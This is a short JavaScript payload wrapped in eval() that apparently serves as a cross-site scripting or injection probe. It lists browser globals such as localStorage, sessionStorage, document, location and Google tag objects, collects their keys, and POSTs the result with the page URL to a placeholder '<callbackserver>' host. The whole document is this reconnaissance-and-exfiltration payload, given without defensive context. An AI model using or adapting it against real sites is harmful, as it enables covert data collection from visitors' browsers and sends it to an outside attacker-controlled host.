eval(`
  var globals = ["window", "document", "navigator", "history", "screen", "localStorage", "sessionStorage", "crypto", "performance", "indexedDB", "location", "alert", "fetch", "google", "gapis", "google_tag_data", "googleapis"];
  var output = [];
  
  globals.forEach(function(item) {
    try {
      var obj = window[item];
      var typeOfObj = typeof obj;
      output.push(item + " is a " + typeOfObj);
      
      if (typeOfObj === 'object' || typeOfObj === 'function') {
        output.push("Keys of " + item + ": " + Object.keys(obj));
      }
    } catch (e) {
      output.push("Error accessing " + item + ": " + e);
    }
  });

  var jsonOutput = JSON.stringify(output);

  fetch('https://<callbackserver>?id=' + document.location, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ data: jsonOutput })
  }).then(response => response.text())
    .then(result => console.log('Data posted:', result))
    .catch(error => console.log('Error:', error));
`);
